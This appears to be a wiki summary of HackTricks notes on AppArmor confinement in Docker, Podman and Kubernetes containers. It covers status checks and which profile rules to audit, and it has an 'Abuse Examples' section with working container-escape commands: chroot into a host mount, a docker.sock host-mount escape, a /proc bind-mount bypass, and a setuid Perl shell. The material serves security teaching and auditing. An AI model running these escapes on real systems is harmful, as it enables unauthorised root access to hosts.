---
title: "HackTricks — AppArmor in Container Environments"
tags:
  [
    container-security,
    apparmor,
    mandatory-access-control,
    privilege-escalation,
    hacktricks,
  ]
sources: [hacktricks-container-apparmor.md]
updated: 2026-05-01
---

# HackTricks — AppArmor in Container Environments

Source: [HackTricks](../entities/hacktricks.md)

## Key Takeaways

AppArmor is a **path-based MAC** layer that continues to matter even after capabilities and seccomp checks. The `docker-default` profile explains why some capability-based PoCs still fail in default Docker containers: it denies sensitive `/proc` writes, `/sys` access, mount operations, and constrains ptrace. Removing AppArmor (`--security-opt apparmor=unconfined`) can turn a risky but constrained configuration into an actively exploitable one.

## docker-default Profile

Broadly: allows ordinary networking, denies writes to most of `/proc`, denies sensitive `/sys` access, blocks mount operations, restricts ptrace from being a general host-probing primitive.

## Runtime Usage

| Runtime          | AppArmor support                                                           |
| ---------------- | -------------------------------------------------------------------------- |
| Docker Engine    | `docker-default` applied automatically on AppArmor-capable hosts           |
| Podman           | Supported via `--security-opt apparmor=<profile>`, less universal          |
| Kubernetes       | `securityContext.appArmorProfile` (GA since v1.30, annotations deprecated) |
| containerd/CRI-O | Follows host AppArmor support + workload settings                          |

**K8s subtlety:** Explicitly setting `appArmorProfile.type: RuntimeDefault` is stricter than omitting the field — omitting may let the workload run on a node without AppArmor and receive no confinement.

## Quick Status Checks (from inside container)

```bash
cat /proc/self/attr/current                    # Current AppArmor label
docker inspect <container> | jq '.[0].AppArmorProfile'
aa-status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50
```

## High-Signal Rules to Audit

When you can read a profile, these rule types materially affect escape viability:

| Rule                       | Significance                                                                 |
| -------------------------- | ---------------------------------------------------------------------------- |
| `ux` / `Ux`                | Execute target unconfined — test reachable helpers/interpreters first        |
| `px` / `Px`, `cx` / `Cx`   | Profile transition on exec — destination may be much broader                 |
| `change_profile`           | Allows runtime switch to another profile — check destination strength        |
| `flags=(complain)`         | Logs denials, does NOT enforce                                               |
| `flags=(unconfined)`       | Removes boundary entirely                                                    |
| `userns` / `userns create` | Mediates user namespace creation — if allowed, nested userns still available |

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' \
  /etc/apparmor.d 2>/dev/null
```

## Abuse Examples

### AppArmor disabled + host root mounted

```bash
cat /proc/self/attr/current   # should show 'unconfined'
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

### AppArmor disabled + runtime socket

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash
```

### Path-based bind mount bypass

AppArmor protecting `/proc/**` does **not** protect the same content reachable through a different path:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

### Shebang interpreter chain bypass

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl && /tmp/test.pl
```

Interpreter chains and alternate execution paths deserve special attention during profile review.

## Misconfigurations

- `--security-opt apparmor=unconfined` left in after debugging
- Assuming bind mounts are harmless — alternate mount paths bypass path-based rules
- Profile name in config does not mean AppArmor is enabled on the node

## Related Pages

- [AppArmor Profiles](../concepts/apparmor-profiles.md)
- [Mandatory Access Control](../concepts/mandatory-access-control.md)
- [Container Security](../concepts/container-security.md)
- [HackTricks — Privileged Containers](hacktricks-privileged-containers.md)
- [HackTricks](../entities/hacktricks.md)
